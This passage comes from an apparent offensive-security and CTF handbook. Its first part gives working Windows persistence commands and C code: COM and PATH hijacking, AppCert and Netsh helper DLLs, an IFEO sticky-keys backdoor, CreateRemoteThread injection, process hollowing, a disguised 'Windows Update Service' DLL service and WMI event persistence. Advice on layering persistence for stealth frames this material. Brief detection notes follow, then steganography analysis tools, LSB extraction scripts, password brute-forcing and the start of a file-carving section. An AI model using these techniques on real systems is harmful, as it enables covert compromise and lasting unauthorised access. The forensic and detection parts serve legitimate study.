cd C:\Users\Public\
C:\Windows\System32\calc.exe
# If calc.exe searches current directory for any DLL, malicious.dll may load
```

**PATH Directory Hijacking**

```cmd
# Add writable directory to beginning of PATH
set PATH=C:\Users\Public\malicious;%PATH%

# Place malicious DLL with common name in C:\Users\Public\malicious\
copy malicious.dll C:\Users\Public\malicious\kernel32.dll
```

**Persistence via PATH Modification**

```cmd
reg add "HKCU\Environment" /v Path /t REG_EXPAND_SZ /d "C:\Users\Public\malicious;%Path%" /f
```

### COM Hijacking

Component Object Model (COM) hijacking redirects COM object instantiation to load malicious DLLs.

**COM Registry Structure**

```
HKEY_CLASSES_ROOT\CLSID\{GUID}\InprocServer32
```

**Finding Hijackable COM Objects**

```powershell
# Search for COM objects with missing DLLs
Get-ChildItem -Path "Registry::HKCR\CLSID" -Recurse -ErrorAction SilentlyContinue | 
    Get-ItemProperty -Name "(default)" -ErrorAction SilentlyContinue |
    Where-Object { $_."(default)" -like "*.dll" } |
    ForEach-Object {
        if (-not (Test-Path $_."(default)")) {
            Write-Host "Missing: $($_."(default)")"
        }
    }
```

**COM Hijacking via User-Level Registry**

```cmd
# Copy COM CLSID entry to HKCU (user-level) to override HKLM
reg copy "HKLM\SOFTWARE\Classes\CLSID\{GUID}" "HKCU\SOFTWARE\Classes\CLSID\{GUID}" /s /f

# Modify InprocServer32 to point to malicious DLL
reg add "HKCU\SOFTWARE\Classes\CLSID\{GUID}\InprocServer32" /ve /t REG_SZ /d "C:\malicious.dll" /f
```

**PowerShell COM Hijacking**

```powershell
$clsid = "{GUID}"
$regPath = "HKCU:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\malicious.dll"
```

**Commonly Hijacked COM Objects**

- Shell extensions
- Explorer context menu handlers
- Property sheet handlers
- Thumbnail handlers

### AppCert DLLs

AppCertDlls registry key loads specified DLLs into every process that calls specific Win32 API functions (`CreateProcess`, `CreateProcessAsUser`, `CreateProcessWithTokenW`, etc.).

**Registry Location**

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls
```

**Setting AppCert DLL**

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls" /v "Malicious" /t REG_SZ /d "C:\malicious.dll" /f
```

**Requirements**

- Requires administrator/SYSTEM privileges
- DLL must export specific function: `CreateProcessNotify`

**DLL Implementation**

```c
#include <windows.h>

BOOL WINAPI CreateProcessNotify(LPCWSTR lpApplicationName, 
                                 LPCWSTR lpCommandLine,
                                 BOOL bCreate) {
    if(bCreate) {
        // Execute malicious code when new process starts
        // Return TRUE to allow process creation
    }
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    return TRUE;
}
```

### Netsh Helper DLL

Netsh (Network Shell) loads helper DLLs from a registry location, providing persistence.

**Registry Location**

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh
```

**Adding Netsh Helper DLL**

```cmd
netsh add helper C:\malicious.dll
```

**Direct Registry Modification**

```cmd
reg add "HKLM\SOFTWARE\Microsoft\NetSh" /v "HelpDllName" /t REG_SZ /d "C:\malicious.dll" /f
```

**DLL Requirements** Must export `InitHelperDll` function:

```c
#include <windows.h>

DWORD WINAPI InitHelperDll(DWORD dwNetshVersion, PVOID pReserved) {
    // Malicious code executes when netsh.exe runs
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Payload, NULL, 0, NULL);
    return NO_ERROR;
}
```

**Triggering**

```cmd
# DLL loads whenever netsh.exe runs
netsh
netsh interface show interface
```

### Image File Execution Options (IFEO)

IFEO registry key can specify a "debugger" for an executable, causing the debugger to run instead of (or alongside) the target application.

**Registry Location**

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable>
```

**Setting Debugger**

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\malicious.exe" /f
```

**Common Targets**

- `sethc.exe` - Sticky Keys (accessible from login screen via Shift x5)
- `utilman.exe` - Utility Manager (Win+U from login screen)
- `osk.exe` - On-Screen Keyboard
- `magnify.exe` - Magnifier

**Sticky Keys Backdoor**

```cmd
# Replace debugger with cmd.exe for login screen access
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f

# Press Shift 5 times at login screen â†’ cmd.exe with SYSTEM privileges
```

**DLL via IFEO** Cannot directly specify DLL, but can use rundll32.exe:

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\target.exe" /v Debugger /t REG_SZ /d "rundll32.exe C:\malicious.dll,EntryPoint" /f
```

### Silent Process Exit Monitoring

Windows Silent Process Exit feature can trigger actions when a process terminates, which can be abused for persistence.

**Registry Location**

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\<executable>
```

**Configuration**

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\csrss.exe" /v ReportingMode /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\csrss.exe" /v MonitorProcess /t REG_SZ /d "C:\malicious.exe" /f

# Enable GlobalFlag for process
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
```

**Mechanism** When monitored process exits, `MonitorProcess` executable is launched. Using critical system process like `csrss.exe` that rarely exits can be combined with intentional crash to trigger payload.

### DLL Injection Techniques

**CreateRemoteThread Injection**

```c
#include <windows.h>
#include <stdio.h>

void InjectDLL(DWORD pid, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // Allocate memory in target process
    LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, 
                                      MEM_COMMIT, PAGE_READWRITE);
    
    // Write DLL path to target process
    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, 
                       strlen(dllPath) + 1, NULL);
    
    // Get LoadLibraryA address
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(
        GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    
    // Create remote thread to load DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                         (LPTHREAD_START_ROUTINE)pLoadLibrary,
                                         pDllPath, 0, NULL);
    
    WaitForSingleObject(hThread, INFINITE);
    
    VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
}
```

**Reflective DLL Injection** Loads DLL directly into memory without writing to disk, bypassing file-based detection.

```c
// Reflective DLL contains custom loader in DllMain
// Manually maps PE sections, resolves imports, fixes relocations
// Executes without LoadLibrary
```

**Process Hollowing**

```c
// 1. Create suspended process
CreateProcess(NULL, "svchost.exe", NULL, NULL, FALSE, 
              CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 2. Unmap legitimate code
NtUnmapViewOfSection(pi.hProcess, pBaseAddress);

// 3. Allocate new memory
VirtualAllocEx(pi.hProcess, pBaseAddress, imageSize, 
               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// 4. Write malicious code
WriteProcessMemory(pi.hProcess, pBaseAddress, maliciousImage, imageSize, NULL);

// 5. Set entry point and resume
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

**APC (Asynchronous Procedure Call) Injection**

```c
// Queue APC to target thread
QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)pDllPath);

// APC executes when thread enters alertable state
```

### PowerShell DLL Persistence

**Invoke-ReflectivePEInjection**

```powershell
# PowerSploit module
Import-Module PowerSploit
Invoke-ReflectivePEInjection -PEPath C:\malicious.dll -ProcName explorer.exe
```

**Add-Type DLL Loading**

```powershell
# Load DLL into PowerShell process
Add-Type -Path "C:\malicious.dll"

# Call exported function
[MaliciousNamespace.MaliciousClass]::MaliciousFunction()
```

**Scheduled Task with DLL**

```powershell
$action = New-ScheduledTaskAction -Execute "rundll32.exe" -Argument "C:\malicious.dll,EntryPoint"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "SystemUpdate" -User "SYSTEM"
```

### DLL Persistence via Services

**Creating Service to Load DLL**

```cmd
sc create MaliciousService binPath= "C:\Windows\System32\svchost.exe -k netsvcs" type= share start= auto
sc description MaliciousService "Windows Update Service"

# Configure service to load DLL
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MaliciousService\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "C:\malicious.dll" /f

sc start MaliciousService
```

**Service DLL Requirements**

```c
#include <windows.h>

// Must export ServiceMain function
void WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    SERVICE_STATUS_HANDLE hStatus = RegisterServiceCtrlHandler(
        TEXT("MaliciousService"), ServiceCtrlHandler);
    
    // Set service status to running
    SERVICE_STATUS status = {0};
    status.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    status.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &status);
    
    // Execute malicious code
    MaliciousFunction();
}

void WINAPI ServiceCtrlHandler(DWORD dwControl) {
    // Handle service control requests
}
```

### WMI Event Subscription Persistence

**Creating WMI Event Consumer with DLL**

```powershell
# Create event filter (trigger)
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "SystemFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Create command line consumer (action)
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "SystemConsumer"
    CommandLineTemplate = "rundll32.exe C:\malicious.dll,EntryPoint"
}

# Bind filter to consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

### DLL Detection and Mitigation

**Detecting Suspicious DLLs**

**Process Explorer (Sysinternals)**

```
1. Run Process Explorer as Administrator
2. Select process
3. View â†’ Lower Pane View â†’ DLLs
4. Examine loaded DLLs for suspicious paths/names
5. Verify DLL signatures
```

**PowerShell DLL Enumeration**

```powershell
# List all loaded DLLs in processes
Get-Process | ForEach-Object {
    $proc = $_
    $_.Modules | ForEach-Object {
        [PSCustomObject]@{
            Process = $proc.Name
            PID = $proc.Id
            DLL = $_.FileName
        }
    }
} | Where-Object { $_.DLL -notlike "C:\Windows\*" }
```

**Autoruns (Sysinternals)**

```
# Identifies DLL-based persistence mechanisms
autoruns.exe
# Check tabs: Logon, Services, Scheduled Tasks, WMI, etc.
```

**Sigcheck (Sysinternals)**

```cmd
# Verify DLL signatures
sigcheck.exe -e -u -s C:\Windows\System32
sigcheck.exe -v C:\suspicious\malicious.dll
```

**WMI Persistence Detection**

```powershell
# List WMI event consumers
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding

# Remove malicious WMI persistence
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='SystemFilter'" | Remove-WmiObject
```

**DLL Hijacking Prevention**

**Application Hardening**

```c
// Use full DLL paths
LoadLibrary("C:\\Windows\\System32\\version.dll");

// Use SetDllDirectory to control search order
SetDllDirectory("C:\\Application\\DLLs");

// Use LoadLibraryEx with LOAD_LIBRARY_SEARCH flags
LoadLibraryEx("version.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
```

**Windows Defender Application Control (WDAC)** Enforces code integrity policies, preventing unsigned DLLs from loading.

**AppLocker DLL Rules**

```powershell
# Create DLL rule allowing only signed DLLs
$rule = New-AppLockerPolicy -RuleType Dll -User Everyone -Condition (
    New-AppLockerPolicyCondition -Publisher "*" -BinaryVersionRange "*"
)
Set-AppLockerPolicy -PolicyObject $rule
```

**Sysmon Configuration for DLL Monitoring**

```xml
<Sysmon schemaversion="4.50">
  <EventFiltering>
    <ImageLoad onmatch="include">
      <ImageLoaded condition="begin with">C:\Users\</ImageLoaded>
      <ImageLoaded condition="begin with">C:\Temp\</ImageLoaded>
    </ImageLoad>
  </EventFiltering>
</Sysmon>
```

**Registry Monitoring**

```powershell
# Monitor for AppInit_DLLs changes
$path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
$watcher = New-Object System.Management.ManagementEventWatcher
$query = "SELECT * FROM RegistryValueChangeEvent WHERE Hive='HKEY_LOCAL_MACHINE' AND KeyPath='SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows' AND ValueName='AppInit_DLLs'"
$watcher.Query = $query
```

---

## Key Operational Considerations

**Stealth vs. Reliability Trade-off**: More sophisticated persistence (bootkits, rootkits) provides better hiding but increases implementation complexity and failure risk. Simple persistence (web shells, registry modifications) is easier to implement but more detectable.

**Layered Persistence**: Deploying multiple persistence mechanisms across different system layers ensures access remains even if one method is discovered and removed.

**Cleanup Considerations**: Persistence mechanisms leave forensic artifacts (registry keys, files, logs). Understanding detection surfaces is critical for operational security.

**Platform Variations**:

- Linux: Focus on cron, systemd, LD_PRELOAD, kernel modules
- Windows: Focus on registry, services, scheduled tasks, DLLs
- Modern protections (Secure Boot, ELAM, PatchGuard, driver signing) significantly complicate kernel-level persistence

**Privilege Requirements**: Most robust persistence requires elevated privileges (administrator/root). Initial access often requires privilege escalation before establishing persistence.

**Detection Landscape**: [Inference: Modern EDR solutions monitor common persistence locations and behaviors, making traditional techniques increasingly detectable. Living-off-the-land approaches using legitimate system features generate less suspicious behavior but provide less reliable persistence.]

---

# Steganography & Data Exfiltration

## Image Steganography Analysis

Image steganography conceals data within image files using techniques like LSB (Least Significant Bit) manipulation, metadata embedding, palette modification, and visual masking. Analysis involves detecting, extracting, and decoding hidden information.

### Initial Reconnaissance

**File Identification**

```bash
# Verify file type (detect mismatched extensions)
file image.jpg

# Detailed file information
exiftool image.jpg

# Check for appended/embedded data
binwalk image.jpg

# Display file structure
hexdump -C image.jpg | head -50
xxd image.jpg | less
```

**Metadata Analysis**

```bash
# Extract all metadata
exiftool -a -G1 image.jpg

# Search for specific fields
exiftool -Comment -Description -Author image.jpg

# Extract GPS coordinates
exiftool -gps:all image.jpg

# View thumbnail embedded in EXIF
exiftool -b -ThumbnailImage image.jpg > thumbnail.jpg

# Search metadata for keywords
exiftool -a image.jpg | grep -i "password\|key\|secret\|flag"
```

**Visual Inspection**

```bash
# Display image
eog image.jpg       # GNOME
feh image.jpg       # Lightweight
gimp image.jpg      # Advanced editing

# Check color channels separately (GIMP)
# Colors â†’ Components â†’ Decompose
# Examine Red, Green, Blue channels individually
```

### LSB (Least Significant Bit) Analysis

LSB steganography modifies the least significant bits of pixel values to encode data. Detection involves statistical analysis and bit-plane examination.

**Zsteg** - Comprehensive LSB analyzer for PNG/BMP

```bash
# Install
gem install zsteg

# Automatic detection of all LSB methods
zsteg image.png

# Analyze all bit planes
zsteg -a image.png

# Extract specific bit order
zsteg -E "b1,rgb,lsb,xy" image.png > extracted.txt

# Check specific channel
zsteg -E "b1,r,lsb,xy" image.png    # Red channel only
zsteg -E "b1,g,lsb,xy" image.png    # Green channel only
zsteg -E "b1,b,lsb,xy" image.png    # Blue channel only

# Extract with different bit orders
zsteg -E "b1,bgr,lsb,xy" image.png  # BGR instead of RGB
zsteg -E "b2,rgb,lsb,xy" image.png  # 2 bits per channel

# Search for file signatures in extracted data
zsteg -E "b1,rgb,lsb,xy" image.png | file -

# Iterate through all possible extractions
zsteg --all image.png > all_extractions.txt
```

**StegSolve** - Visual bit plane analysis (Java-based)

```bash
# Launch
java -jar stegsolve.jar

# Manual operations:
# 1. File â†’ Open â†’ Select image
# 2. Navigate through bit planes using arrow keys:
#    - Red/Green/Blue plane 0-7
#    - Alpha plane 0-7
#    - RGB combinations
# 3. Analyze â†’ Data Extract
#    - Select bit planes (LSB/MSB)
#    - Preview extracted data
#    - Save extracted file

# Common extraction patterns:
# - Red plane 0 (LSB)
# - Green plane 0 (LSB)
# - Blue plane 0 (LSB)
# - RGB plane 0 combined
```

**Stegdetect** - Statistical stego detection

```bash
# Install
apt install stegdetect

# Detect steganography methods
stegdetect image.jpg

# Output interpretation:
# jphide    - JPHide
# jsteg     - JSteg
# outguess  - OutGuess
# invisible - Invisible Secrets
# f5        - F5 algorithm

# Sensitivity adjustment
stegdetect -s 10.0 image.jpg  # Higher sensitivity (more false positives)
```

**Stegbreak** - Brute force stego password

```bash
# Dictionary attack on JSteg
stegbreak -t j -f /usr/share/wordlists/rockyou.txt image.jpg

# OutGuess brute force
stegbreak -t o -f wordlist.txt image.jpg

# Specify multiple files
stegbreak -t j -f wordlist.txt *.jpg
```

### Tool-Specific Extraction

**Steghide** - JPEG/BMP/WAV/AU steganography

```bash
# Extract with password
steghide extract -sf image.jpg -p password123

# Extract with prompt
steghide extract -sf image.jpg

# View embedded file info without extracting
steghide info image.jpg

# Check if file contains steghide data
steghide info image.jpg 2>&1 | grep -i "embedded"

# Brute force with stegseek (faster alternative)
apt install stegseek
stegseek image.jpg /usr/share/wordlists/rockyou.txt
```

**OutGuess** - Statistical steganography for JPEG

```bash
# Extract without password
outguess -r image.jpg output.txt

# Extract with key
outguess -k "password" -r image.jpg output.txt

# Show statistics
outguess -r image.jpg output.txt -s
```

**Stegpy** - Python-based LSB steganography

```bash
# Install
pip3 install stegano

# Extract LSB data
stegano-lsb reveal -i image.png -o output.txt

# Extract with specific encoding
stegano-lsb-set reveal -i image.png -o output.txt

# Red LSB only
stegano-red-lsb reveal -i image.png -o output.txt
```

**OpenStego** - Open source steganography (Java)

```bash
# Extract data
java -jar openstego.jar extract -sf image.png -xf output.txt -p password
```

### Advanced Techniques

**Manual LSB Extraction with Python**

```python
from PIL import Image
import sys

def extract_lsb(image_path):
    img = Image.open(image_path)
    pixels = img.load()
    width, height = img.size
    
    binary_data = ""
    
    for y in range(height):
        for x in range(width):
            pixel = pixels[x, y]
            # Extract LSB from each RGB channel
            if isinstance(pixel, tuple):
                for value in pixel[:3]:  # RGB only
                    binary_data += str(value & 1)
            else:  # Grayscale
                binary_data += str(pixel & 1)
    
    # Convert binary to bytes
    output = ""
    for i in range(0, len(binary_data), 8):
        byte = binary_data[i:i+8]
        if len(byte) == 8:
            output += chr(int(byte, 2))
    
    return output

# Usage
data = extract_lsb('image.png')
print(data[:500])  # Print first 500 characters
```

**Frequency Analysis for JPEG**

```bash
# Extract DCT coefficients using jpegsnoop
jpegsnoop image.jpg > analysis.txt

# Analyze compression artifacts
identify -verbose image.jpg | grep -i "quality\|compression"

# Compare with original (if available)
compare original.jpg stego.jpg difference.png
```

**Color Palette Analysis (GIF/PNG)**

```bash
# Extract palette
convert image.gif -unique-colors palette.png

# Count unique colors
identify -format "%k" image.png

# [Inference] Unusual palette sizes may indicate embedded data
# Standard palettes: 2, 4, 8, 16, 32, 64, 128, 256 colors
```

**Alpha Channel Extraction**

```bash
# Extract alpha channel
convert image.png -alpha extract alpha.png

# View alpha channel
zsteg -E "b8,a,lsb,xy" image.png

# Check for hidden data in alpha
python3 << 'EOF'
from PIL import Image
img = Image.open('image.png')
if img.mode == 'RGBA':
    alpha = img.split()[3]
    alpha.save('alpha_extracted.png')
EOF
```

### Detecting Data at File End

**Check for Trailing Data**

```bash
# Compare file size with expected size
binwalk image.jpg

# Extract embedded files
binwalk -e image.jpg

# Manually extract trailing data
tail -c +<offset> image.jpg > extracted_data

# Search for file signatures
strings -n 8 image.jpg | grep -E "^(PK|Rar!|7z|PDF)"

# Extract all recognizable files
foremost -i image.jpg -o output_dir
```

**PNGCheck** - PNG integrity verification

```bash
# Install
apt install pngcheck

# Check PNG structure
pngcheck -v image.png

# Detect anomalies
pngcheck -cvt image.png
```

### Multi-Layer Steganography

**Recursive Analysis**

```bash
# Extract first layer
steghide extract -sf image1.jpg -p pass1

# Check extracted file
file extracted.dat

# If it's another image, analyze again
zsteg extracted.png
steghide info extracted.jpg
```

**QR Code Overlay Detection**

```bash
# Detect QR codes in image
zbarimg image.png

# Decode manually with zbar
zbarcam  # Use webcam to display on screen

# Extract QR from specific region (ImageMagick)
convert image.png -crop 200x200+50+50 qr_region.png
zbarimg qr_region.png
```

### Automated Stego Analysis Scripts

**Steg-Toolkit** - Comprehensive automation

```bash
# Clone repository
git clone https://github.com/DominicBreuker/steg_toolkit.git
cd steg_toolkit

# Build Docker container
docker build -t steg_toolkit .

# Run all tools on image
docker run -v $(pwd):/data steg_toolkit /data/image.png
```

**Custom Bash Analysis Script**

```bash
#!/bin/bash
IMAGE="$1"

echo "[*] Analyzing: $IMAGE"

echo "[+] File type:"
file "$IMAGE"

echo "[+] Metadata:"
exiftool "$IMAGE" | grep -i "comment\|description"

echo "[+] Binwalk:"
binwalk "$IMAGE"

echo "[+] Strings:"
strings "$IMAGE" | head -20

if [[ "$IMAGE" == *.png ]]; then
    echo "[+] Zsteg:"
    zsteg -a "$IMAGE"
fi

if [[ "$IMAGE" == *.jpg ]]; then
    echo "[+] Steghide info:"
    steghide info "$IMAGE" 2>&1
    
    echo "[+] Stegdetect:"
    stegdetect "$IMAGE"
fi

echo "[+] Foremost extraction:"
foremost -i "$IMAGE" -o "${IMAGE}_foremost"
```

---

## Audio Steganography Analysis

Audio steganography hides data in audio files using LSB manipulation, phase encoding, spread spectrum techniques, echo hiding, and metadata embedding.

### Initial Analysis

**File Information**

```bash
# Identify audio format
file audio.wav

# Detailed audio properties
mediainfo audio.wav
soxi audio.wav  # SoX utility

# Check for anomalies
ffprobe audio.mp3 2>&1 | grep -i "duration\|bitrate\|sample"

# Extract metadata
exiftool audio.mp3
id3v2 -l audio.mp3  # MP3 ID3 tags
```

**Visual Spectrum Analysis**

```bash
# Generate spectrogram
sox audio.wav -n spectrogram -o spectrogram.png

# High resolution spectrogram
sox audio.wav -n spectrogram -x 3000 -y 513 -z 120 -o spectrogram_hires.png

# View in Sonic Visualiser
sonic-visualiser audio.wav

# View in Audacity
audacity audio.wav
# Analyze â†’ Plot Spectrum (Ctrl+U)
# View â†’ Show Spectrogram
```

**Spectrogram Hidden Messages** [Inference] Text or images encoded in spectrograms appear as visual patterns when the audio is analyzed. Common in CTF challenges.

```bash
# Look for patterns in spectrogram
# Numbers, letters, QR codes visible at specific frequencies

# Adjust spectrogram settings in Audacity:
# - Window size: 4096 or 8192
# - Algorithm: Frequencies (log)
# - Scale: Logarithmic or Mel
```

### LSB Analysis in Audio

**WavSteg** - WAV file LSB steganography

```bash
# Install
pip3 install stegano

# Extract LSB data from WAV
stegano-lsb-set reveal -i audio.wav -o output.txt

# Python script for manual LSB extraction
python3 << 'EOF'
import wave

def extract_lsb_wav(wav_file):
    audio = wave.open(wav_file, 'rb')
    frames = audio.readframes(audio.getnframes())
    audio.close()
    
    extracted = ""
    for i in range(0, len(frames), 8):
        byte = 0
        for j in range(8):
            if i+j < len(frames):
                byte |= (frames[i+j] & 1) << j
        if byte != 0:
            extracted += chr(byte)
    
    return extracted

data = extract_lsb_wav('audio.wav')
print(data[:500])
EOF
```

**DeepSound** - Windows audio steganography tool

```bash
# Cannot be directly detected on Linux
# [Unverified] Detection methods:
# - Check for unusual file size
# - Look for markers in hex: "DEEP" or specific byte patterns
# - Statistical analysis of audio data distribution

# Extract suspected DeepSound data
strings audio.wav | grep -i "deep"
```

**Coagula** - Image to sound conversion

```bash
# Coagula converts images to audio
# Reverse: Convert audio back to image

# Manual approach: analyze spectrogram and screenshot
sox audio.wav -n spectrogram -o decoded_image.png

# Adjust contrast/brightness in GIMP to reveal hidden image
```

### Metadata Analysis

**ID3 Tags (MP3)**

```bash
# View ID3 tags
id3v2 -l audio.mp3
eyeD3 audio.mp3

# Extract album art
eyeD3 --write-images=./ audio.mp3

# Search for hidden data in tags
exiftool -a audio.mp3 | grep -i "comment\|lyrics\|description"

# Hex dump of ID3 tags
head -c 4096 audio.mp3 | xxd | grep -A 10 "ID3"
```

**FLAC Metadata**

```bash
# View FLAC tags
metaflac --list audio.flac

# Export embedded pictures
metaflac --export-picture-to=cover.jpg audio.flac

# Check for unusual tags
metaflac --show-tag=COMMENT audio.flac
```

**OGG Vorbis Comments**

```bash
# List comments
vorbiscomment -l audio.ogg

# Extract specific comment
vorbiscomment -l audio.ogg | grep -i "description"
```

### Phase and Echo Analysis

**Detect Phase Encoding**

```bash
# Compare left and right channels
sox audio.wav left.wav remix 1
sox audio.wav right.wav remix 2

# Analyze phase difference
# Load both in Audacity, invert one channel, mix
# Hidden data appears as residual audio
```

**Echo Hiding Detection**

```bash
# Generate autocorrelation plot in Sonic Visualiser
# Plugins â†’ Analysis â†’ Autocorrelation

# Look for periodic patterns indicating echo delays
# Delays at specific intervals may contain encoded bits
```

### Frequency Analysis

**Detect Hidden Carriers**

```bash
# Generate frequency spectrum
sox audio.wav -n stat -freq 2> spectrum.txt

# Look for unusual frequencies outside normal range
# Check for narrow-band carriers (spread spectrum stego)

# FFT analysis
python3 << 'EOF'
import numpy as np
import scipy.io.wavfile as wav

rate, data = wav.read('audio.wav')
fft = np.fft.fft(data)
freqs = np.fft.fftfreq(len(data), 1/rate)

# Plot frequency spectrum
import matplotlib.pyplot as plt
plt.plot(freqs[:len(freqs)//2], np.abs(fft)[:len(fft)//2])
plt.savefig('spectrum.png')
EOF
```

**DTMF Tone Detection**

```bash
# Detect DTMF (telephone keypad) tones
multimon-ng -a DTMF -t wav audio.wav

# Manual detection with audacity
# Analyze â†’ Plot Spectrum
# Look for pairs of frequencies:
# 1209, 1336, 1477, 1633 Hz (columns)
# 697, 770, 852, 941 Hz (rows)
```

### Tool-Specific Extraction

**Hideme** - Multi-format audio stego

```bash
# [Unverified] Tool availability and usage may vary
# Typically works with WAV files

# Check for hideme markers
strings audio.wav | grep -i "hideme"
```

**Steg86** - 8086 Assembly steganography

```bash
# Extract hidden data encoded as x86 instructions
# Uncommon but appears in advanced CTF challenges

git clone https://github.com/woodruffw/steg86.git
cd steg86
./steg86 extract audio.bin > extracted.txt
```

**AudioStego (Python)**

```bash
# Install
pip3 install audiostego

# Extract data
audiostego decode audio.wav output.txt
```

### Advanced Techniques

**Silence Analysis**

```bash
# Detect unusual silence patterns
sox audio.wav -n stat 2>&1 | grep -i "silence\|maximum\|minimum"

# Extract silence regions (may contain metadata)
sox audio.wav silence.wav silence 1 0.1 1% 1 0.1 1%

# Analyze gaps between audio segments
# Morse code or binary encoding in silence durations
```

**Bit Depth Manipulation**

```bash
# Check bit depth
soxi audio.wav | grep "Precision"

# [Inference] Unusual bit depths (e.g., 24-bit when 16-bit expected)
# May indicate extra data in lower bits

# Convert to lower bit depth and compare
sox audio.wav -b 8 audio_8bit.wav
```

**Sampling Rate Anomalies**

```bash
# Check sampling rate
soxi audio.wav | grep "Sample Rate"

# [Inference] Unusual sample rates may hide data
# Standard rates: 44100 Hz, 48000 Hz, 96000 Hz

# Resample and compare
sox audio.wav -r 44100 audio_resampled.wav
```

**Morse Code in Audio**

```bash
# Filter specific frequency for morse code
sox audio.wav -n sinc 700-900  # Typical CW frequency

# Decode morse with multimon
multimon-ng -a MORSE_CW -t wav audio.wav

# Manual morse analysis
# Short beep = dot (.)
# Long beep = dash (-)
# Use Audacity to measure timing
```

### Spectral Watermarking

**Detect Frequency Watermarks**

```bash
# Generate spectrogram with time markers
sox audio.wav -n spectrogram -x 4000 -y 1025 -z 120 -t "Spectrogram Analysis" -o output.png

# Look for:
# - Text spelled out in frequencies
# - QR codes in spectrum
# - Patterns at specific time intervals
# - Hidden images (LSB in frequency domain)
```

### Automated Audio Stego Scripts

**Comprehensive Audio Analysis**

```bash
#!/bin/bash
AUDIO="$1"

echo "[*] Analyzing: $AUDIO"

echo "[+] File info:"
file "$AUDIO"
soxi "$AUDIO"

echo "[+] Metadata:"
exiftool "$AUDIO"

echo "[+] Spectrogram:"
sox "$AUDIO" -n spectrogram -o "${AUDIO}_spectrogram.png"

echo "[+] Frequency analysis:"
sox "$AUDIO" -n stat -freq 2> "${AUDIO}_freq.txt"

echo "[+] Silence detection:"
sox "$AUDIO" -n stat 2>&1 | grep -i "silence\|length"

echo "[+] Strings:"
strings "$AUDIO" | head -30

echo "[+] DTMF detection:"
multimon-ng -a DTMF -t wav "$AUDIO" 2>/dev/null

echo "[+] LSB extraction attempt:"
python3 -c "
import wave
try:
    audio = wave.open('$AUDIO', 'rb')
    frames = audio.readframes(audio.getnframes())[:1000]
    lsb = ''.join([str(b & 1) for b in frames])
    print(lsb[:200])
except:
    print('Error extracting LSB')
"
```

---

## File Carving

File carving recovers files from raw data by identifying file signatures (magic bytes), structures, and footers without filesystem metadata. Essential for analyzing disk images, memory dumps, and corrupted storage.

### Core Concepts

**File Signatures (Magic Bytes)** - Unique byte sequences identifying file types

Common signatures:

```
PNG:  89 50 4E 47 0D 0A 1A 0A
JPEG: FF D8 FF
GIF:  47 49 46 38
PDF:  25 50 44 46
ZIP:  50 4B 03 04
RAR:  52 61 72 21
7z:   37 7A BC AF 27 1C
GZIP: 1F 8B
BMP:  42 4D
WAV:  52 49 46 46
```

### Foremost - Header/Footer Carving

**Basic Usage**

```bash
# Carve all supported file types
foremost -i disk.img -o output_dir

# Carve specific file types
foremost -t jpg,png,pdf -i disk.img -o output_dir

